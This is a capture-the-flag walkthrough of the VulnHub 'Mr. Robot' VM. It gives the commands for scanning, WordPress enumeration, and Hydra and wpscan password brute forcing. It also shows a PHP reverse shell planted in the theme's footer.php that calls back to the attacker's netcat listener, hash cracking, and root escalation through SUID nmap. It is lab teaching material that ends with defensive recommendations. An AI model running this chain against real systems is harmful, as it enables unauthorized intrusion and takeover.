# Mr. Robot CTF - Complete Walkthrough
## Overview

**VM Name:** Mr. Robot: 1  
**Source:** [VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/)  
**Difficulty:** Beginner-Intermediate  
**Objective:** Capture three flags hidden throughout the system

This CTF is based on the TV show *Mr. Robot* and challenges participants to locate three progressively difficult keys without requiring advanced exploitation or reverse engineering skills.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Application Analysis](#2-web-application-analysis)
3. [Credential Discovery](#3-credential-discovery)
4. [Initial Access](#4-initial-access)
5. [Lateral Movement](#5-lateral-movement)
6. [Privilege Escalation](#6-privilege-escalation)
7. [Flags](#7-flags)

---

## 1. Reconnaissance

### Network Scanning

Initial network discovery using Nmap to identify the target:

```bash
nmap -sV -sC -p- 10.0.2.0/24
```

**Key Findings:**

| Port | State  | Service |
|------|--------|---------|
| 22   | Closed | SSH     |
| 80   | Open   | HTTP    |
| 443  | Open   | HTTPS   |

**Target IP:** `10.0.2.11`

The closed SSH port suggests remote access might be restricted, directing focus toward web-based attack vectors.

---

## 2. Web Application Analysis

### Nikto Scan

Web vulnerability scanning revealed critical information:

```bash
nikto -h http://10.0.2.11
```

**Significant Discoveries:**
- WordPress installation detected
- Multiple administrative endpoints found (`/wp-admin/`, `/wp-login.php`)
- Apache mod_negotiation enabled (potential information disclosure)
- Server running PHP 5.5.29

### Directory Enumeration

Checking `robots.txt` revealed interesting files:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Flag 1 obtained:** `073403c8a58a1f80d943455fb30724b9`

### WordPress Enumeration

```bash
wpscan --url http://10.0.2.11 --enumerate u,vp
```

**Environment Details:**
- **WordPress Version:** 4.3.1 (vulnerable, released 2015-09-15)
- **Theme:** Twenty Fifteen v1.3
- **XML-RPC:** Enabled (potential attack vector)

### Dictionary Analysis

Downloaded the discovered dictionary file:

```bash
curl -O http://10.0.2.11/fsocity.dic
```

The file contained 858,160 lines with significant duplication. Cleaned using:

```bash
sort fsocity.dic | uniq > fs.dic
```

**Result:** Reduced to 11,451 unique entries

---

## 3. Credential Discovery

### Username Enumeration

WordPress login error messages disclose whether usernames exist. Leveraged this with Hydra:

```bash
hydra -L fs.dic -p test 10.0.2.11 http-post-form \
'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -f
```

**Discovered Username:** `Elliot`

### Password Brute Force

With a valid username, performed targeted password attack:

```bash
wpscan --url http://10.0.2.11 -P fs.dic -U Elliot
```

**Credentials Found:**
- **Username:** `Elliot`
- **Password:** `ER28-0652`

---

## 4. Initial Access

### WordPress Admin Exploitation

Successfully authenticated to the WordPress dashboard at `/wp-admin/`.

### Reverse Shell Deployment

**Method:** Theme file modification

WordPress allows editing PHP theme files directly through the admin interface. Modified `footer.php` in the Twenty Fifteen theme with a PHP reverse shell.

**Shell Code Source:**
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./
```

**Configuration:**
```php
$ip = '10.0.2.6';    // Attacker IP
$port = 4444;         // Listener port
```

**Deployment Steps:**
1. Navigate to `Appearance > Editor`
2. Select `footer.php`
3. Replace content with modified reverse shell code
4. Start listener: `nc -nvlp 4444`
5. Trigger execution by visiting any page on the site

### Shell Stabilization

Initial shell was non-interactive. Upgraded using Python PTY:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

**Access Level:** `daemon` user

---

## 5. Lateral Movement

### User Enumeration

```bash
ls -la /home/robot/
```

**Files Found:**
- `key-2-of-3.txt` (read permission denied)
- `password.raw-md5` (world-readable)

### Hash Cracking

```bash
cat password.raw-md5
# Output: robot:c3fcd3d76192e4007dfb496cca67e13b
```

Used online MD5 hash database:

**Cracked Password:** `abcdefghijklmnopqrstuvwxyz`

### User Switching

```bash
su robot
# Enter password: abcdefghijklmnopqrstuvwxyz
```

**Flag 2 obtained:** `822c73956184f694993bede3eb39f959`

---

## 6. Privilege Escalation

### SUID Binary Discovery

Searched for binaries with SUID bit set:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

**Critical Finding:**
```
-rwsr-xr-x 1 root root 504736 Nov 13 2015 /usr/local/bin/nmap
```

### Exploitation

Nmap version 3.81 includes an interactive mode that spawns a shell with elevated privileges:

```bash
nmap --interactive
nmap> !sh
# whoami
root
```

**Reference:** [GTFOBins - Nmap](https://gtfobins.github.io/gtfobins/nmap/)

### Root Access

```bash
cd /root
ls -la
cat key-3-of-3.txt
```

**Flag 3 obtained:** `04787ddef27c3dee1ee161b21670b4e4`

---

## 7. Flags

| Flag | Location | Value |
|------|----------|-------|
| Key 1 | `/robots.txt` → `key-1-of-3.txt` | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
| Key 3 | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |

---

## Key Takeaways

### Vulnerabilities Exploited

1. **Information Disclosure** - robots.txt exposed sensitive files
2. **Weak Credentials** - Dictionary attack successful against WordPress
3. **Insecure File Permissions** - World-readable password hash
4. **Misconfigured SUID Binaries** - Nmap with SUID allowed privilege escalation
5. **Outdated Software** - WordPress 4.3.1 and PHP 5.5.29 contain known vulnerabilities

### Security Recommendations

- Remove or restrict access to `robots.txt` if it contains sensitive paths
- Implement account lockout policies and strong password requirements
- Regular security updates for CMS platforms
- Audit SUID binaries and remove unnecessary permissions
- Use principle of least privilege for file permissions
- Disable WordPress file editor in production environments

---

## Tools Used

- **Nmap** - Network scanning and service enumeration
- **Nikto** - Web server vulnerability scanner
- **WPScan** - WordPress security scanner
- **Hydra** - Network authentication cracker
- **Netcat** - Network utility for reverse shells
- **Python** - Shell stabilization and TTY spawning

---

## Author

**0xCr0nu5**  
Connect with me: [GitHub](https://github.com/0xCr0nu5) 

---

*Disclaimer: This writeup is for educational purposes only. Always obtain proper authorization before testing security on any system.*
